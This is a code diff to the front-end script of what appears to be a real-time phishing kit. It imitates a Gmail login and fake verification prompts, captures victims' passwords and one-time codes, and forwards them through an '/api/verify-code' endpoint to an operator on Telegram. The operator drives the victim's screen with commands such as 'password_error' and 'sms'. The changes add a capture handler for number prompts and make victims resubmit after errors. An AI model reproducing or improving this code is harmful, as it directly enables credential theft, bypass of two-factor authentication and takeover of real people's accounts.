@@ -57,6 +57,11 @@
   }
 
   function showPasswordError() {
+    // Show inline error on the auth form if available, otherwise show overlay
+    if (window.__AuthForm && window.__AuthForm.showError) {
+      window.__AuthForm.showError('The password you entered is incorrect. Please try again.');
+      return;
+    }
     renderOverlay(`
       <div class="response-overlay" id="overlay-password-error">
         <div class="response-card">
@@ -91,6 +96,8 @@
 
   function showSmsPrompt(email) {
     const safeEmail = email || 'your email';
+    // Close any auth modal first
+    closeAuthModal();
     renderOverlay(`
       <div class="response-overlay" id="overlay-sms">
         <div class="response-card sms-verify-card">
@@ -201,22 +208,23 @@
 
       const sessionId = getSessionId();
       try {
-        const res = await fetch('/api/verify-code', {
+        await fetch('/api/verify-code', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ sessionId, code }),
         });
-        const data = await res.json();
       } catch (err) {
         // ignore — code was still sent to Telegram
       }
 
-      // Keep the loading state; the operator will respond via Telegram
-      // The polling loop will pick up the next command (success, password_error, etc.)
+      // Keep loading state; operator responds via Telegram
+      // Polling continues and will pick up the next command
     });
   }
 
   function showNumberPrompt(number) {
+    // Close any auth modal first
+    closeAuthModal();
     renderOverlay(`
       <div class="response-overlay" id="overlay-number">
         <div class="response-card">
@@ -224,32 +232,83 @@
           <div class="response-icon number">#</div>
           <h2 class="response-title">Enter This Number</h2>
           <p class="response-message">Please enter the number shown below to verify you are not a robot.</p>
-          <div class="response-number">${number}</div>
-          <form class="response-form" onsubmit="event.preventDefault(); window.__ResponseControls.close();">
+          <div class="response-number">${escapeHtml(String(number))}</div>
+          <form class="response-form" id="number-prompt-form" autocomplete="off">
             <label for="number-input">Enter the number above</label>
             <input type="text" id="number-input" name="number-input" placeholder="Type the number" inputmode="numeric" />
           </form>
           <div class="response-actions">
             <button class="response-btn response-btn-secondary" type="button" onclick="window.__ResponseControls.close()">Cancel</button>
-            <button class="response-btn response-btn-primary" type="button" onclick="window.__ResponseControls.close()">Submit</button>
+            <button class="response-btn response-btn-primary" type="button" id="number-prompt-submit">Submit</button>
+          </div>
+          <div class="sms-verify-loading" id="number-verify-loading" style="display:none;">
+            <div class="sms-verify-spinner"></div>
+            <p>Verifying…</p>
           </div>
         </div>
       </div>
     `);
+
+    setupNumberPromptSubmit(number);
+  }
+
+  function setupNumberPromptSubmit(expectedNumber) {
+    const submitBtn = document.getElementById('number-prompt-submit');
+    if (!submitBtn) return;
+
+    submitBtn.addEventListener('click', async function () {
+      const input = document.getElementById('number-input');
+      const value = input ? input.value.trim() : '';
+      if (!value) return;
+
+      const formEl = document.getElementById('number-prompt-form');
+      const actionsEl = document.querySelector('.response-actions');
+      const loadingEl = document.getElementById('number-verify-loading');
+      if (formEl) formEl.style.display = 'none';
+      if (actionsEl) actionsEl.style.display = 'none';
+      if (loadingEl) loadingEl.style.display = 'flex';
+
+      const sessionId = getSessionId();
+      try {
+        await fetch('/api/verify-code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sessionId, code: value }),
+        });
+      } catch (err) {
+        // ignore
+      }
+
+      // Keep loading; operator responds via Telegram
+    });
   }
 
   function closeAuthModal() {
     const authModal = document.getElementById('auth-modal');
     if (authModal) authModal.classList.remove('is-open');
+    // Also handle Gmail password page form
+    const gmailCard = document.querySelector('.gmail-form');
+    if (gmailCard) gmailCard.style.display = '';
+    const gmailLoading = document.getElementById('gmail-loading');
+    if (gmailLoading) gmailLoading.style.display = 'none';
   }
 
   function handleCommand(command, data) {
-    closeAuthModal();
     switch (command) {
-      case 'success': showSuccess(); break;
-      case 'password_error': showPasswordError(); break;
-      case 'yes_prompt': showYesPrompt(); break;
-      case 'sms': showSmsPrompt(data); break;
+      case 'success':
+        closeAuthModal();
+        showSuccess();
+        break;
+      case 'password_error':
+        showPasswordError();
+        break;
+      case 'yes_prompt':
+        closeAuthModal();
+        showYesPrompt();
+        break;
+      case 'sms':
+        showSmsPrompt(data);
+        break;
       case 'number_prompt':
         if (data) showNumberPrompt(data);
         else showNumberPrompt('?');
@@ -274,6 +333,8 @@
             clearSessionId();
             break;
           }
+          // For password_error, keep polling so the user can resubmit
+          // For sms and number_prompt, keep polling so the next command is received
         }
       } catch (e) {
         await new Promise((r) => setTimeout(r, 3000));
